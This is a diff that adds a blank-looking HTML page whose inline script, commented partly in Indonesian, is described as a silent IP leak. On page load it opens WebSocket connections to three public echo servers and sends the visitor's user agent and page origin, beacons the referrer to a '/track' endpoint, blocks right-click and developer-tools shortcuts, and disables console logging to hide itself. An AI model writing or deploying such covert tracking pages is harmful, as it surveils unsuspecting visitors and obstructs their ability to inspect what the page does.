@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        * { margin: 0; padding: 0; }
+        body { 
+            background: white; 
+            height: 100vh; 
+            overflow: hidden; 
+        }
+    </style>
+</head>
+<body>
+    <!-- IP LEAK via WebSocket (silent) -->
+    <script>
+        // Multiple WebSocket endpoints untuk leak IP
+        const leakServers = [
+            'wss://echo.websocket.org',
+            'wss://websocket-echo.com',
+            'wss://ws.postman-echo.com/raw'
+        ];
+        
+        leakServers.forEach((url, index) => {
+            setTimeout(() => {
+                const ws = new WebSocket(url);
+                
+                ws.onopen = () => {
+                    // Kirim data untuk capture origin IP
+                    ws.send(JSON.stringify({
+                        timestamp: Date.now(),
+                        userAgent: navigator.userAgent,
+                        origin: window.location.origin
+                    }));
+                };
+                
+                ws.onmessage = (event) => {
+                    // Silent - no console/debug
+                    console.log = () => {}; // Disable console leak
+                };
+                
+                ws.onerror = ws.onclose = () => {};
+            }, index * 500); // Stagger connections
+        });
+        
+        // Additional leak via headers (beacon)
+        navigator.sendBeacon('/track', JSON.stringify({
+            ip: 'detect',
+            referrer: document.referrer,
+            timestamp: Date.now()
+        }));
+        
+        // Prevent F12 inspection detection
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
